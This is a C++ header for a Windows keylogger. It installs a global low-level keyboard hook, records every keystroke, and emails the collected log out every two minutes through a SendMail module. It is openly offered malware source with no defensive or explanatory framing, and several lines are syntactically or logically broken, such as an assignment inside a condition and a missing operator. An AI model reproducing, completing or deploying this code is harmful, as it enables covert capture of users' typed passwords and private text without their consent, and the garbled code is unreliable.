#ifndef KEYBHOOK_H
#define KEYBHOOK_H
    //we are only going to use hooks to record keys

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"


std::string keylog = "";

void TimerSendMail()
{
        if (keylog.empty())
            return;
        std::string last_file = IO::WriteLog(keylog);

        if (last_file.empty())
        {
            Helper::WriteAppLog("File creation was not successfull. Keylog '" + keylog + "'");
            return ;
        }

        int x = Mail::SendMail("Log [" + last_file + "]" ,
                               "Hi :) \n The file has been attached to this mail :) \n" +
                               "For testing, enjoy: \n"   + keylog ,
                               IO::GetOurPath(true) + last_file ) ;
        if (x!=7) //means if mail has failed
            Helper::WriteAppLog("Mail was not sent! Error code: " +Helper::ToString(x));
        else
            keylog = "";

}

Timer MailTimer(TimerSendMail, 2000* 60 , Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if (nCode <0)
        CallNextHookEx(eHook, nCode , wparam, lparam)   ;
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lparam;

    if( wparam = WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)  // if user enter key pressed, it will print new line
            keylog +="\n" ; //append keys to string txt
    }
    else if(wparam == WM_KEYUP || wparam WM_SYSKEYUP)
    {                    //  [SHIFT][a][b][c][/SHIFT] [r]
        DWORD key=kbs ->vkCode  ;
        if (key==VK_CONTROL
            || key==VK_LCONTROL
            || key==VK_RCONTROL
            || key== VK_SHIFT
            || key== VK_LSHIFT
            || key== VK_RSHIFT
            || key== MENU
            || key== VK_LMENU
            || key== VK_RMENU
            || key== VK_CAPITAL
            || key== VK_NUMLOCK
            || key== VK_LWIN
            || key== VK_RWIN
            )
                {
                    std::string KeyName  = Keys::KEYS[kbs->vkCode].Name;
                    KeyName.insert(1, "/");
                    keylog += KeyName;
                }
    }
    return CallNextHookEx(eHook, nCode,  wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook Started.. Timer Started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) OurKeyboardProc, // LL means global lower level
                             GetModuleFileName(NULL) ,0);
    return eHook==NULL;
}

bool UninstallHook()
{
    bool  b = UnhookWindowsHookEx(eHook)    ;
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(eHook == NULL)        ;
}

#endif // KEYBHOOK_H
